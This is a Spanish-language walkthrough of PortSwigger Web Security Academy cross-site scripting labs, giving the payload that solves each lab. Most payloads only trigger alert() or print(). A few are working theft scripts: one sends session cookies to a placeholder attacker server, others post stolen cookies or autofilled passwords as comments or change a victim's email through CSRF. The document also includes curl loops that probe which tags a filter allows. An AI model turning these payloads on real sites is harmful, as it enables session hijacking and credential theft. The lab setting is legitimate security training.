---
description: All labs of Portswigger https://portswigger.net/web-security/all-labs
---

# Cross-Site-Scripting (Labs)

### Reflected XSS into HTML context with nothing encoded

Vemos un input para buscar contenido, probamos su función y vemos que al escribir cualquier cosa, se ve reflejado en el HTML posterior.

![Formulario de búsqueda](<../.gitbook/assets/image (25).png>)

Al ver reflejado lo que buscamos podemos pensar que quizás se puede inyectar código, probemos con lo más básico.

```
<script>alert()</script>
```

Y nos sale el mensaje de alerta

![Mensaje de alerta](<../.gitbook/assets/image (27) (1) (1).png>)

### Stored XSS into HTML context with nothing encoded

En este caso tenemos que escribir un comentario que provoque un Stored XSS, es decir, que cada persona que entrase en la página donde está dicho comentario le salte el código inyectado.

Probamos directamente a meter el básico en el texto del comentario:

```
<script>alert()</script>
```

¡Y funciona!

### DOM XSS in document.write sink using source location.search

Otra vez tenemos el Input de búsqueda, y también nos imprime como en el primero lo que escribimos, pero cuando probamos el básico de antes vemos que no funciona.

En este caso inspeccionamos el elemento y encontramos el script que está haciendo posible la búsqueda:

```
trackSearch(query) {
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
trackSearch(query);
}
                    
```

donde pone query parece ser que es donde se añadirá la petición que hagamos, de hecho si miramos un poco más abajo en el código vemos lo siguiente:

```
<img src="/resources/images/tracker.gif?searchTerms=cualquier_cosa">
```

Por lo que podemos construir una query que acabe con esa, por ejemplo:

```
asd'"><script>alert()</script> <"

#Esto quedaría de la siguiente forma en el script
<img src="..searchTerms='asd'"><script>alert()</script> <"">');
```

También podéis optar por la respuesta de PortSwigger algo más elegante:

```
"><svg onload=alert(1)>
```

### DOM XSS in document.write sink using source location.search inside a select element

En este caso nos tenemos que ir dentro de uno de los elementos de la "tienda" y vemos que hay un formulario que realiza un "Check stock" Cómo antes vamos a inspeccionarlo a ver si vemos algo.

Efectivamente encontramos un script:

```
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
    }
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
    }
document.write('</select>');                
```

Básicamente estamos viendo que aparte de los valores que tienes en la variable stores, que coinciden con los del formulario que estamos viendo también existe otra variable que luego añade al formulario.

Lo importante es ¿De donde coge esa variable?

```
var store = (new URLSearchParams(window.location.search)).get('storeId');
```

Parece ser que busca dentro de los parámetros de la URL uno que se llame 'storeId', ¿Esto quiere decir que si introducimos ese valor en la URL el formulario cambia? Comprobemoslo:

```
.../product?productId=1&storeId=cualquier_cosa
```

![Formulario](<../.gitbook/assets/image (26) (1) (1) (1).png>)

¡Perfecto! Ahora nos queda comprobar que ocurre si inyectamos una alerta, no parece que haga ningún tipo de validación de datos, así que vamos a comprobar a lo fácil:

```
.../product?productId=1&storeId=<script>alert()</script>
```

![Mensaje de alerta](<../.gitbook/assets/image (29) (1) (1) (1).png>)

¡Funcionó!

### DOM XSS in innerHTML sink using source location.search

Volvemos a tener el formulario de búsqueda, y además nos encontramos el siguiente script al inspeccionar:

```
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
    }
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
    }
```

Nos damos cuenta que lo que escribimos lo añade directamente al HTML justo en el div superior, por lo que podemos probar a introducir algo que al cargar genere una respuesta en script

```
<img src="https://acb51f291fa14bcbc0ddb3ef008e000d.web-security-academy.net/resources/labheader/images/logoAcademy.svg" onload="alert()">
```

![Formulario búsqueda tras inyección](<../.gitbook/assets/image (24) (1).png>)

Este quise probarlo porque me llamaba la atención que pueda introducir una imagen directamente, y de paso termino el ejercicio gracias al parámetro "onload" pero podríamos realizarlo de otras formas, por ejemplo con un onerror:

```
<img src="" onerror=alert()>
```

### DOM XSS in jQuery anchor href attribute sink using location.search source

En esta ocasión parece que tenemos que explotar un stored XSS, por lo que nos vamos a donde dice Submit Feedback y vamos a inspeccionar a ver si vemos algo:

```
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
```

Para acabar el ejercicio tenemos que conseguir una alerta con el "document.cookie", y vemos que en el script superior está utilizando el parámetro GET de la url para determinar el href de un botón.

Probamos entonces a poner en la URL tras returnPATH=dondeestas, recargamos y tras inspeccionar la página vemos que el botón de back de abajo tiene el siguiente href:

```
href="dondeestas"
```

Así que vamos a transformarlo en algo que pueda darnos las cookies:

```
dondeestas" onload="alert(document.cookie)

#Quedaría tal que así
href="dondeestas" onload="alert(document.cookie)">
```

Pero resulta que no nos funciona y nos intenta mandar a la siguiente URL "https://../dondeestas" onload="alert(document.cookie)" Pero aún podemos probar mediante el comando "javascript:" Esto nos permite hacer que un href realice alguna función, cómo por ejemplo cambiar el color del fondo [https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref\_oper\_void](https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref\_oper\_void)

```
feedback?returnPath=javascript:alert(document.cookie)
```

¡Y conseguimos acabar el ejercicio!

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Utilizamos el formulario de búsqueda y al inspeccionar el código en esta ocasión aunque no tenemos un script como tal si que vemos que en body tenemos la directiva ng-app=""

Esta directiva le dice a AngularJS que este es el elemento raíz de la aplicación AngularJS, por lo que podemos utilizar una expresión Angular

```
{{$on.constructor('alert()')()}}
```

### Reflected DOM XSS

Si inspeccionamos el código fuente veremos que search llama a un .js alojado en otro sitio. Entramos y echamos un ojo, vemos que la respuesta se utiliza con una función eval y con algunas pruebas vemos qué esta escapando, en este caso las comillas pero no la barra invertida.

Lo que debemos hacer entonces es primero escapar la barra invertida mediante otra barra invertida "\\" cerramos el término de búsqueda con unas comillas dobles '"', separamos las expresiones con un operador, llamamos a alert cerramos la llave '}' para terminar la función y comentamos lo que haya detrás con dos barras '//'

```
\"/alert(1)}//
```

### Stored DOM XSS

Si miramos bien el código fuente nos damos cuenta de que existe un .js que es el encargado de cargar los comentarios, así que le echamos un ojo y vemos que realiza una función replace contra el símbolo menor que "<" y mayor que ">".

Realmente la función replace únicamente hace efecto con la primera coincidencia que encuentra. Para hacernos una idea en el siguiente código reemplazaríamos Hola por adiós.

```html
<!DOCTYPE html>
<html>
<body>

<p id="demo">Hola Paco</p>

<script>
let text = document.getElementById("demo").innerHTML; 
document.getElementById("demo").innerHTML = text.replace("Hola", "Adios");;
</script>

</body>
</html>
```

![Output del código](<../.gitbook/assets/image (27) (1).png>)

Sin embargo si ponemos dos Holas:

```html
<!DOCTYPE html>
<html>
<body>

<p id="demo">Hola Hola Paco</p>

<script>
let text = document.getElementById("demo").innerHTML; 
document.getElementById("demo").innerHTML = text.replace("Hola", "Adios");;
</script>

</body>
</html>
```

![Output código](<../.gitbook/assets/image (29) (1) (1).png>)

Con esto realmente ya sabemos que si escapamos por primera vez esos símbolos que están siendo reemplazados podemos inyectar nuestro código, o al menos intentarlo:

```
<><img src="" onerror=alert()> 
```

Y efectivamente funciona.

### Exploiting cross-site scripting to steal cookies

Para realizar este laboratorio se requiere Burpsuite Pro, así que vamos a deducir la forma de realizarlo. Nos piden que robemos una cookie de sesión de un usuario ficticio que estará viendo la web y nos logueemos como si fuésemos él.

Viendo que en los comentarios un simple:

```
<script>alert()</script>
```

Funciona perfectamente, yo mandaría entonces el siguiente script:

```
<script>document.write("<img src="http://URLdemiservidoratacante/img.jpg?cookie=' + document.cookie + '">)</script>
```

De esta manera estoy enviando por una petición GET las cookies y puedo ver la petición en mi propio servidor.

#### ¡¡IMPORTANTE!!

Volviendo a este ejemplo de XSS me di cuenta que no necesitamos BurpsuitePro para acabar el lab, ya que podemos aprovecharnos de un CSRF, tras mirar por Burpsuite las peticiones a la hora de rellenar un formulario intenté diseñar una petición mediante fetch de javascript a la propia web para que publicase automáticamente su cookie de sesión en el foro.

Por supuesto esto no tendría sentido en un ataque ya que generalmente lo que va a querer el atacante es obtener la cookie de sesión sin llamar la atención y sin mostrarla a todo el mundo, pero es un método para acabar el laboratorio así que a por ello.

La idea es utilizar el obligar al usuario a enviar un comentario con sus cookies.

Así que vamos a crear la petición para aprovecharnos del CSRF

```
<script>
var peticion = new XMLHttpRequest();
peticion.onload = handleResponse;
peticion.open('get','/post?postId=5',true);
peticion.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var galleta = document.cookie
    var cambio = new XMLHttpRequest();
    cambio.open('post', '/post/comment', true);
    cambio.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    cambio.setRequestHeader("Referer", "https://acf31f071e6ced55c089267300ff0020.web-security-academy.net/post?postId=5");
    cambio.send('csrf='+token+'&postId=5&comment='+galleta+'&name=admin&email=admin%40prueba.com&website=')
};
</script>
```

¿Qué estamos haciendo?

* Creamos una nueva petición con --> var peticion = new XMLHttpRequest();
* Específicamos una función que se llevará a cabo cuando cargue --> peticion.onload = handleResponse;
* Tipo de petición, web y si es asíncrona o no lo es --> peticion.open('get','/post?postId=5',true);
* Enviamos la petición --> peticion.send();
* Dentro de la función tenemos lo siguiente:
  * Obtención del token csrf de protección, para ello utilizamos responseText para obtener en formato texto y le decimos que nos de las coincidencias que estén entre los valores siguientes.
  * Obtención de las cookies.
  * Abrimos una nueva petición.
  * La configuramos para que sea una petición válida.

¡EUREKA!

### Exploiting cross-site scripting to capture passwords

En esta ocasión es similar al anterior pero tenemos que conseguir un usuario y contraseña que se autocompletará y será enviado, cómo no dispongo de Burpsuite Pro tengo que hacerlo también a través de un CSRF.

En este caso me di más cabezazos incluso que en el anterior, y al final llegue a la conclusión de hacerlo de este modo, aunque no es el que más me gusta por ahora me vale porque funciona.

```
<form><input type="text" id="username" name="username"></form>
<form><input type="password" id="password" name="password"></form>
<script>
window.onload = function(e) {
    setTimeout(function() {
        var csrf = document.getElementsByName("csrf")[0].value;
        var username = document.getElementById("username").value;
        var passw = document.getElementById("password").value;
        console.log(csrf);
        fetch('https://acdf1f561f118404c0e40a6400770035.web-security-academy.net/post/comment', {
            method: 'POST',
        headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://acdf1f561f118404c0e40a6400770035.web-security-academy.net/post?postId=3',
},
            body: 'csrf=' + csrf + '&postId=3&comment=Username: ' + username + ', Password: ' + passw + '&name=Jan&email=admin%40cmdnctrl.net&website='
        });
    }, 2500);
};
</script>
```

### Exploiting XSS to perform CSRF

En esta ocasión tenemos que repetir el mismo ataque que hemos hecho en los anteriores ejemplos pero para cambiar el email de quien vea el comentario del blog. Lo primero que debemos hacer es comprobar que petición hay que realizar para hacer dicho cambio.

```http
POST /my-account/change-email HTTP/1.1

Content-Type: application/x-www-form-urlencoded

Referer: https://ac901fca1e4a5a0ac0a5045a00bb00bf.web-security-academy.net/my-account?id=wiener



email=asd%40asd.com&csrf=X7gAbqRx2BQR1W6OKKTy3pr8pCdG85BA
```

Entre otras cosas parece ser que realiza una petición de tipo POST, también probaría con el Content-Type y el Referer ya que en los anterior ejemplos los he necesitado, y por último simplemente hay que indicar el csrf y el email. Por lo que podemos hacer en principio el siguiente script:

```
<script>
var peticion = new XMLHttpRequest();
peticion.onload = handleResponse;
peticion.open('get','/my-account',true);
peticion.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var cambio = new XMLHttpRequest();
    cambio.open('post', '/my-account/change-email', true);
    cambio.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    cambio.setRequestHeader("Referer", "https://ac901fca1e4a5a0ac0a5045a00bb00bf.web-security-academy.net/my-account");
    cambio.send('csrf='+token+'&email=asd%40asd.com')
};
</script>
```

### Reflected XSS into HTML context with most tags and attributes blocked

Èn este caso tenemos que intentar mediante un XSS Reflected conseguir un print(); Cuando intentamos meter un tag de tipo "\<script>" nos dice que dicho tag no está permitido. Aquí podemos hacer un ataque de fuerza bruta para encontrar los tags que están permitidos, podéis hacerlo con Burpsuite (Aunque sin el Pro es lentísimo) o crearos vuestro propio script:

```bash
#!/bin/bash

while read -r i; do
       permitido=$(curl -s https://ac031f9f1e172472c07e28d900f10056.web-security-academy.net/\?search=%3C$i%3E | grep -o allowed)
       if [ "$permitido" != "allowed" ]; then
               echo "El tag $i está permitido"
       fi
       permitido=""
done < tags.txt
```

Básicamente lo que he hecho en el script superior es meter todos los posibles tags sacados de [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) en un documento llamado tags.txt. A continuación voy iterando para descubrir cual está permitido:

![Output del script](<../.gitbook/assets/image (28) (1) (1) (1) (1).png>)

Una vez obtenido tengo que conseguir los eventos que nos permite:

```
while read -r i; do
        permitido=$(curl -s https://ac031f9f1e172472c07e28d900f10056.web-security-academy.net/\?search=%3Cbody%20$i=1%3E | grep -o allowed)
        if [ "$permitido" != "allowed" ]; then
                echo "El evento $i está permitido"
        fi
        permitido=""
done < events.txt
```

![Output del script](<../.gitbook/assets/image (26) (1) (1).png>)

Básicamente lo que sabemos es que dentro de la petición únicamente podemos utilizar body y onresize, esto quiere decir que para poder explotar la vulnerabilidad debería hacerse desde un sitio externo ya que la única forma de que el evento onresize funcione es que cambien manualmente el tamaño de la pantalla o que sea provocado, al no poder provocarlo en dicho servidor debemos hacerlo en uno externo.

Para ello el laboratorio nos permite pulsar arriba en "exploit server" y allí únicamente tenemos que realizar el siguiente script:

```
<iframe src="https://ac031f9f1e172472c07e28d900f10056.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='500px'> 
```

La petición la realizamos sobre la web pero el cambio de tamaño lo provocamos en el servidor externo mediante un cambio de estilo. Podéis probar lo que pasaría introduciendo el script siguiente en el cuadro de búsqueda y ampliando o reduciendo manualmente vosotros:

```
<body onresize=alert()>
```

### Reflected XSS into HTML context with all tags blocked except custom ones

Aquí he tenido algunos problemas ya que por más que intentaba provocar una alerta nunca fui capaz de verla, al final terminé mirando la solución e incluso con la solución pese a darme por válida la entrega seguía sin ver en ningún momento la alerta, así que os dejo el script de la solución y a ver si más adelante veo porque no puedo ver la supuesta alerta:

```
<script>
location = 'https://acbd1fd91f5a860cc02258ef007e0045.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script> 
```

Básicamente lo que hace es crear un nuevo tag que ha llamado XSS con un id X al que cuando la página le hace focus genera la alerta, a continuación en la URL se pone el Focus en el elemento con id X mediante "#x" y supuestamente salta la alerta.

### Reflected XSS with event handlers and href attributes blocked

Este ejercicio me pareció bastante divertido en general, creo que es importante pelearte con él un rato y luego ya si te has perdido mucho ver la posible respuesta y jugar con ella.

En este caso tras pasar los scripts creados en ejercicios anteriores para comprobar qué podemos usar obtuve lo siguiente:

![Output del script](<../.gitbook/assets/image (30) (1) (1) (1) (1) (1).png>)

Así que tenemos que jugar con esas etiquetas, no existe ningún evento que podamos utilizar y tampoco href, si nos hubiesen dejado "href" y "a" sería más sencillo ¿no?

En este caso tenemos que jugar con svg y con animate, ¿Cómo podemos hacerlo?, entendiendo bien el funcionamiento:

```
<svg><rect width="100" height="100"><animate attributeName="rx" from="0" to="50" dur="5s" repeatCount="indefinite"/></rect></svg>
```

Si probáis con el Payload superior veréis que aparece un cuadrado negro, el cual tiene una animación en relación a sus esquinas que se van redondeando hasta convertirse en un círculo. Lo que hemos hecho es crear un objeto svg en el que el atributo va cambiando con el tiempo.

Lo interesante es que también podemos seleccionar otro atributo cómo podría ser el href, por ejemplo en el siguiente caso lo que hacemos es cambiar el atributo href para que vaya cambiando, unas veces llevará a la misma página "#" y otras veces llevará a google, podéis comprobarlo.

```
<svg><a><animate attributeName=href from=# to="https://google.com" dur="5s" repeatCount="indefinite" /><text x=20 y=20>Click me</text></a> 
```

Esto simplemente es una tontería para demostrar cómo con algo de imaginación y lo poco que teníamos se puede crear un Payload que nos permita tener un href, aunque la etiqueta cómo tal no nos permita tenerla.

```
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a> 
```

### Reflected XSS with some SVG markup allowed

Seguimos tirando de los scripts creados anteriormente para conseguir los tags que podemos utilizar y los eventos, de hecho lo he acomodado un poco, os lo dejo por aquí:

```
#!/bin/bash

url=https://ac5b1ffa1ebd852dc075081e00cc001d.web-security-academy.net/

tags () {
	while read -r i; do
		permitido=$(curl -s $url/\?search=%3C$i%3E | grep -o allowed)
		if [ "$permitido" != "allowed" ]; then
			echo $i
		fi
		permitido=""
	done < tags.txt
}

eventos () {
	while read -r i; do
		permitido=$(curl -s $url/\?search=%3Csvg%20$i=1%3E | grep -o allowed)
		if [ "$permitido" != "allowed" ]; then
			echo "El evento $i está permitido"
		fi
		permitido=""
	done < events.txt
}

#Descomentar cuando se quiera usar uno u otro
#tags
#eventos
```

![Output del script](<../.gitbook/assets/image (29) (1).png>)

![Output del script](<../.gitbook/assets/image (26) (1).png>)

Lo tenemos sencillo, únicamente tenemos que comenzar una transformación y utilizar el evento onbegin para que salte la alerta cuando comience dicha transformación, me he tomado la licencia de meter un elemento divertido mientras.

```
<svg><rect width="100" height="100"><animateTransform attributeName="transform" type="translate" from="0 0" to="150 20" dur="5s" repeatCount="indefinite" onbegin=alert()>
```

### Reflected XSS into attribute with angle brackets HTML-encoded

Cómo siempre tenemos que fijarnos bien qué está pasando, cuando nosotros enviamos cualquier carácter que consideremos y miramos el código fuente de la respuesta vemos que dentro del valor value del input está mostrándose nuestro payload, por eso cada vez que enviamos una búsqueda nos devuelve el campo relleno con la búsqueda anterior.

Esto quiere decir que nos tenemos que fijar cómo esta hecho, vemos que es de la siguiente forma:

```
value="cualquiercosa">
```

Por lo que en principio podríamos escapar la comilla simple y poner nuestro evento Javascript después:

```
borra esto" oninput="alert()
```

Sólo tenemos que intentar borrar o modificar el input y salta la alerta.



### Stored XSS into anchor href attribute with double quotes HTML-encoded

En este caso tenemos un stored XSS en la sección comentarios y nos dicen que tenemos que conseguir que salte una alerta cuando se pulse el nombre del autor del comentario.

Lo primero es ver cómo funciona el sistema de comentarios, así que rellenamos todos los campos y vemos qué ocurre. Nos damos cuenta de que el campo website genera un enlace encima del nombre del usuario.

Viendo el código fuente vemos que está dentro de un href, así que podemos probar simplemente con:

```
javascript:alert()
```

¡Acabado!

### Reflected XSS in canonical link tag

En este caso tenemos que fijarnos la forma en la que nos está llevando a las distintas páginas, utiliza links canónicos. Si miramos el código fuente tras entrar a cualquier página de blog vemos lo siguiente:

```
<link rel="canonical" href='https://ac621fc51fccfabfc01d679100570003.web-security-academy.net/post?postId=4'/>
```

¿Podríamos introducir un Payload que al pulsar cierta combinación provoque el efecto?

```
https://ac621fc51fccfabfc01d679100570003.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert()
```

Al presionar Alt+x nos salta la alerta.

### Reflected XSS into a JavaScript string with single quote and backslash escaped

Vemos que lo que escribimos lo utiliza para hacer un document.write:

```javascript
<script>
var searchTerms = 'a';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Y si intentamos introducir directamente un \<script>alert()\</script> vemos lo siguiente:

![Código fuente](<../.gitbook/assets/image (22) (1).png>)

Por lo que nos está interpretando correctamente el cierre de script, esto también lo intuimos viendo la respuesta:

![Respuesta](<../.gitbook/assets/image (30) (1) (1) (1) (1).png>)

Cómo se puede ver en la imagen no está efectuando document.write, es decir, hemos conseguido cerrarlo antes de llamarlo, por lo que si introducimos el siguiente Payload conseguiremos una alerta:

```
a'</script><script>alert();</script>
```

### Reflected XSS into a JavaScript string with angle brackets HTML encoded

En esta ocasión vemos que no podemos utilizar los símbolos mayor que y menor que, por lo que tenemos que probar si nos permite algún símbolo concreto, y efectivamente vemos que no escapa la comilla simple, por lo que podemos transformar a nuestro antojo el payload que se provoca:

```
';alert()//
```

### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

Este caso es bastante sencillo entendiendo el anterior, aunque en esta ocasión si que nos está escapando la comilla simple podemos intentar escapar el escape:

```
\';alert()//
```

### Reflected XSS in a JavaScript URL with some characters blocked

Sinceramente lo tengo en pendientes ya que no di con la solución, espero volver más adelante con ello. Sé que hay que inyectar algo en la URL para conseguir hacer saltar una alerta en el botón de volver al Blog ya que es el único dato que podemos llegar a cambiar, pero no he encontrado el Payload adecuado.

### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

En este caso, vemos que lo que introducimos como web se convierte en:

```
<a id="author" href="https://1234abcd.com" onclick="var tracker={track(){}};tracker.track('https://1234abcd.com');">asd</a>
```

Ya estamos avisados de que no podemos utilizar comillas simples, comillas dobles ni barras invertidas,  pero ¿Y si las damos directamente URLencodeadas?

```
&apos;-alert()-&apos;
```

### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

En esta ocasión podemos ver que cuando intentamos introducir algo nos lo convierte a caracteres literales unicode. Por lo que es tan sencillo como realizar el siguiente Payload:

```
${alert()}
```

### Reflected XSS with AngularJS sandbox escape without strings

En proceso

### Reflected XSS with AngularJS sandbox escape and CSP

En proceso

### Reflected XSS protected by CSP, with dangling markup attack

En principio no puedo realizarlo sin Burpsuite Pro.

### Reflected XSS protected by very strict CSP, with dangling markup attack

En principio no puedo realizarlo sin Burpsuite pro

### Reflected XSS protected by CSP, with CSP bypass

En proceso
